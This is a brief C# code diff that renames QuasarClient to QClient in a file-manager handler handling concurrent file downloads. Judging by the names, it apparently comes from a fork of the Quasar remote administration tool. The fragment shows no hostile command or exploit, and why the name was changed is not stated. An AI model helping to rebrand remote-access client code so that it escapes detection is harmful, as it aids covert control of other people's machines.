@@ -23,13 +23,13 @@ namespace Ton618.MessageHandlers
         private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
         private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
 
-        private readonly QuasarClient _client;
+        private readonly QClient _client;
 
         private CancellationTokenSource _tokenSource;
 
         private CancellationToken _token;
 
-        public FileManagerHandler(QuasarClient client)
+        public FileManagerHandler(QClient client)
         {
             _client = client;
             _client.ClientState += OnClientStateChange;
